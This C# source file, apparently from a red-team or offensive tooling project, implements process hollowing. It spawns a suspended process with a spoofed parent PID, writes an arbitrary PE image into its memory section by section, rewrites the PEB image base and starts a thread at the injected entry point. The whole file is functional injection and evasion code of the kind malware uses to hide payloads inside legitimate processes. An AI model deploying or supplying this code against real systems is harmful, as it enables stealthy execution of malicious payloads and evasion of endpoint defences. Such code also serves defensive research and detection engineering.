using System;
using System.Collections.Generic;
using System.IO;
using ProcessHollowing.Interop;

namespace ProcessHollowing.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateHollowingProcess(
            byte[] imageData,
            string commandLine,
            int ppid,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            IntPtr hHollowingProcess;
            IntPtr pPeb;
            IntPtr pEntryPoint;
            IntPtr pRemoteImageBase;
            IntPtr pHollowRegion;
            IntPtr pImageBase;
            IntPtr pImageDataBase;
            IntPtr pSectionData;
            IntPtr pWriteRegion;
            MEMORY_PROTECTION memProtection;
            string imagePathName;
            PeFile.IMAGE_FILE_MACHINE architecture;
            List<string> sectionNames;
            bool isExecutable;
            bool isWritable;
            bool isReadable;
            bool is64BitImage;
            uint imageSize;
            var sectionVirtualAddresses = new Dictionary<string, uint>();
            var sectionVirtualSizes = new Dictionary<string, uint>();
            var sectionFlags = new Dictionary<string, PeFile.SectionFlags>();
            var sectionPointerToRawData = new Dictionary<string, uint>();
            var sectionSizeOfRawData = new Dictionary<string, uint>();

            if (Environment.Is64BitProcess && (IntPtr.Size != 8))
            {
                Console.WriteLine("[!] In 64bit OS, target image's architecture should be built as 64bit binary.");

                return false;
            }
            else if (!Environment.Is64BitProcess && (IntPtr.Size != 4))
            {
                Console.WriteLine("[!] In 32bit OS, target image's architecture should be built as 32bit binary.");

                return false;
            }

            imagePathName = Helpers.ResolveImagePathName(commandLine);

            if (string.IsNullOrEmpty(imagePathName))
            {
                Console.WriteLine("[-] Failed to resolve image path name from command line.");

                return false;
            }

            try
            {
                using (var peFile = new PeFile(imagePathName))
                {
                    architecture = peFile.Architecture;
                    is64BitImage = peFile.Is64Bit;
                }

                Console.WriteLine("[*] Got target information.");
                Console.WriteLine("    [*] Image Path Name : {0}", imagePathName);
                Console.WriteLine("    [*] Architecture    : {0}", architecture);
                Console.WriteLine("    [*] Command Line    : {0}", commandLine);

                if (Environment.Is64BitProcess && !is64BitImage)
                    throw new InvalidDataException("In 64bit OS, target image's architecture should be x64.");
                else if (!Environment.Is64BitProcess && is64BitImage)
                    throw new InvalidDataException("In 32bit OS, target image's architecture should be x86.");

                using (var peImage = new PeFile(imageData))
                {
                    pImageBase = peImage.GetImageBase();
                    pImageDataBase = peImage.GetBufferPointer();

                    Console.WriteLine("[>] Analyzing PE image data.");

                    if (peImage.Architecture != architecture)
                        throw new InvalidDataException("Architecture mismatch.");

                    imageSize = peImage.GetSizeOfImage();
                    sectionNames = new List<string>(peImage.GetSectionNames());

                    if (sectionNames.Count == 0)
                        throw new InvalidDataException("No sections found from loaded data.");

                    foreach (var name in sectionNames)
                    {
                        sectionVirtualAddresses.Add(name, peImage.GetSectionVirtualAddress(name));
                        sectionVirtualSizes.Add(name, peImage.GetSectionVirtualSize(name));
                        sectionFlags.Add(name, peImage.GetSectionCharacteristics(name));
                        sectionPointerToRawData.Add(name, peImage.GetSectionPointerToRawData(name));
                        sectionSizeOfRawData.Add(name, peImage.GetSectionSizeOfRawData(name));
                    }

                    Console.WriteLine("[+] Image data is analyzed.");
                    Console.WriteLine("    [*] Architecture  : {0}", peImage.Architecture);
                    Console.WriteLine("    [*] Image Size    : 0x{0}", imageSize.ToString("X"));
                    Console.WriteLine("    [*] Section Count : {0}", sectionNames.Count);

                    Console.WriteLine("[>] Trying to create hollowing process.");

                    hHollowingProcess = Utilities.CreateSuspendedProcess(imagePathName, ppid);

                    if (hHollowingProcess == IntPtr.Zero)
                        return false;
                    else
                        Console.WriteLine("[+] Hollowing process is created successfully.");

                    if (!Helpers.GetProcessBasicInformation(
                        hHollowingProcess,
                        out PROCESS_BASIC_INFORMATION pbi))
                    {
                        Console.WriteLine("[-] Failed to get ntdll!_PEB for the hollowing process.");
                        NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                        return false;
                    }
                    else
                    {
                        pPeb = pbi.PebBaseAddress;
                        Console.WriteLine("[+] Got doppelgaenging process basic information.");
                        Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                        Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
                    }

                    pRemoteImageBase = Helpers.GetImageBaseAddress(hHollowingProcess, pPeb);

                    if (pRemoteImageBase == IntPtr.Zero)
                    {
                        Console.WriteLine("[-] Failed to get ntdll!_PEB for the hollowing process.");
                        NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                        return false;
                    }
                    else
                    {
                        Console.WriteLine(
                            "[*] Image base address for the hollowing process is 0x{0}.",
                            pRemoteImageBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                    }

                    pHollowRegion = Helpers.AllocateReadWriteMemory(
                        hHollowingProcess,
                        IntPtr.Zero,
                        peImage.GetSizeOfImage());

                    if (pHollowRegion == IntPtr.Zero)
                    {
                        Console.WriteLine("[-] Failed to allocate memory in the hollowing process.");
                        NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                        return false;
                    }
                    else
                    {
                        Console.WriteLine(
                            "[*] Allocated 0x{0} bytes memory at 0x{1} in the hollowing process.",
                            peImage.GetSizeOfImage().ToString("X"),
                            pHollowRegion.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                        pEntryPoint = new IntPtr(pHollowRegion.ToInt64() + peImage.GetAddressOfEntryPoint());
                    }

                    Console.WriteLine("[>] Trying to write image data in the hollowing process.");

                    // Copy PE Headers
                    if (!Helpers.WriteMemory(
                        hHollowingProcess,
                        pHollowRegion,
                        pImageDataBase,
                        peImage.GetSizeOfHeaders()))
                    {
                        Console.WriteLine("[-] Failed to write PE headers.");
                        NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                        return false;
                    }
                    else
                    {
                        if (!Helpers.UpdateMemoryProtection(
                            hHollowingProcess,
                            pHollowRegion,
                            peImage.GetBaseOfCode(),
                            MEMORY_PROTECTION.READONLY))
                        {
                            Console.WriteLine("[-] Failed to memory protection for PE headers.");
                            NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                            return false;
                        }
                    }

                    // Write Section data
                    foreach (var name in sectionNames)
                    {
                        isExecutable = (sectionFlags[name] & PeFile.SectionFlags.MEM_EXECUTE) != 0;
                        isReadable = (sectionFlags[name] & PeFile.SectionFlags.MEM_READ) != 0;
                        isWritable = (sectionFlags[name] & PeFile.SectionFlags.MEM_WRITE) != 0;

                        if (isExecutable && isReadable && isWritable)
                            memProtection = MEMORY_PROTECTION.EXECUTE_READWRITE;
                        else if (isExecutable && isReadable && !isWritable)
                            memProtection = MEMORY_PROTECTION.EXECUTE_READ;
                        else if (isExecutable && !isReadable && !isWritable)
                            memProtection = MEMORY_PROTECTION.EXECUTE;
                        else if (!isExecutable && isReadable && isWritable)
                            memProtection = MEMORY_PROTECTION.READWRITE;
                        else if (!isExecutable && isReadable && !isWritable)
                            memProtection = MEMORY_PROTECTION.READONLY;
                        else
                            throw new InvalidDataException("Unexpected section protection.");

                        pWriteRegion = new IntPtr(pHollowRegion.ToInt64() + sectionVirtualAddresses[name]);
                        pSectionData = new IntPtr(pImageDataBase.ToInt64() + sectionPointerToRawData[name]);

                        if (!Helpers.WriteMemory(
                            hHollowingProcess,
                            pWriteRegion,
                            pSectionData,
                            sectionSizeOfRawData[name]))
                        {
                            Console.WriteLine("[-] Failed to write {0} section.", name);
                            NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                            return false;
                        }
                        else
                        {
                            if (!Helpers.UpdateMemoryProtection(
                                hHollowingProcess,
                                pWriteRegion,
                                sectionVirtualSizes[name],
                                memProtection))
                            {
                                Console.WriteLine("[-] Failed to update memory protection for {0} section.", name);
                                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                                return false;
                            }
                        }
                    }

                    Console.WriteLine("[+] Image data is written completely.");
                }
            }
            catch (InvalidDataException ex)
            {
                Console.WriteLine("[!] {0}", ex.Message.ToString());

                return false;
            }
            catch
            {
                Console.WriteLine("[!] Unexpected exception is thrown.");

                return false;
            }

            // Overwrite ntdll!_PEB for hollowing process.
            if (!Helpers.SetImageBaseAddress(hHollowingProcess, pPeb, pHollowRegion))
            {
                Console.WriteLine("[-] Failed to set new ntdll!_PEB.ImageBaseAddress.");
                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                return false;
            }

            if (Utilities.SetProcessParameters(
                hHollowingProcess,
                imagePathName,
                commandLine,
                Environment.CurrentDirectory,
                windowTitle) == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to set process parameters for the hollowing process.");
                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                return false;
            }

            Console.WriteLine("[>] Trying to start hollowing process thread.");

            ntstatus = NativeMethods.NtCreateThreadEx(
                out IntPtr hThread,
                ACCESS_MASK.THREAD_ALL_ACCESS,
                IntPtr.Zero,
                hHollowingProcess,
                pEntryPoint,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create thread.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
            }
            else
            {
                Console.WriteLine("[+] Thread is resumed successfully.");
            }

            NativeMethods.NtClose(hThread);
            NativeMethods.NtClose(hHollowingProcess);

            return (ntstatus == Win32Consts.STATUS_SUCCESS);
        }
    }
}
